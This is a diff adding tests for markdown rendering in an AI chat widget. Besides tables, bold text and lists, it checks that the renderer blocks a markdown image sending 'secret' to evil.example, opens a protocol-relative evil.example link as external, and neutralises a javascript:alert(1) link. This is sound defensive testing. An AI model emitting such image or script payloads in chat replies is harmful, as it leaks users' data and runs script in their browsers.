@@ -199,3 +199,66 @@ describe('MessageContent link parsing', () => {
     expect(screen.getByText('Here is a plain response with no links.')).toBeDefined();
   });
 });
+
+describe('MessageContent markdown rendering', () => {
+  async function sendAssistantReply(message: string) {
+    mockMutate.mockImplementation((_data, options) => {
+      options.onSuccess({
+        conversationId: 1,
+        message,
+        timestamp: new Date().toISOString(),
+      });
+    });
+
+    const user = userEvent.setup();
+    renderWithProviders(<ChatWidget />);
+    await user.click(screen.getByRole('button', { name: 'Open AI chat assistant' }));
+    await user.type(screen.getByPlaceholderText('Ask about events...'), 'hi');
+    await user.click(screen.getByRole('button', { name: 'Send message' }));
+  }
+
+  it('renders a markdown table as a table with links in cells', async () => {
+    await sendAssistantReply(
+      [
+        '| Event | Venue | Price |',
+        '|---|---|---|',
+        '| [Norah Jones](/events/norah-jones) | Blue Note | $54.59 |',
+      ].join('\n'),
+    );
+
+    expect(screen.getByRole('table')).toBeDefined();
+    expect(screen.getAllByRole('columnheader')).toHaveLength(3);
+    expect(screen.getByRole('link', { name: 'Norah Jones' }).getAttribute('href')).toBe(
+      '/events/norah-jones',
+    );
+    expect(screen.getByRole('cell', { name: 'Blue Note' })).toBeDefined();
+  });
+
+  it('renders bold text and bullet lists', async () => {
+    await sendAssistantReply('**Blue Note**\n- Show one\n- Show two');
+
+    expect(screen.getByText('Blue Note').tagName).toBe('STRONG');
+    expect(screen.getAllByRole('listitem')).toHaveLength(2);
+  });
+
+  it('does not render markdown images', async () => {
+    await sendAssistantReply('Look ![tracker](https://evil.example/x.png?d=secret) here');
+
+    expect(document.querySelector('img')).toBeNull();
+  });
+
+  it('treats protocol-relative links as external, not Router routes', async () => {
+    await sendAssistantReply('[Offsite](//evil.example/login)');
+
+    const link = screen.getByRole('link', { name: 'Offsite' });
+    expect(link.getAttribute('target')).toBe('_blank');
+    expect(link.getAttribute('rel')).toBe('noopener noreferrer');
+  });
+
+  it('does not render javascript: links as clickable hrefs', async () => {
+    await sendAssistantReply('[click me](javascript:alert(1))');
+
+    const link = screen.queryByRole('link', { name: 'click me' });
+    expect(link?.getAttribute('href') ?? '').not.toContain('javascript:');
+  });
+});
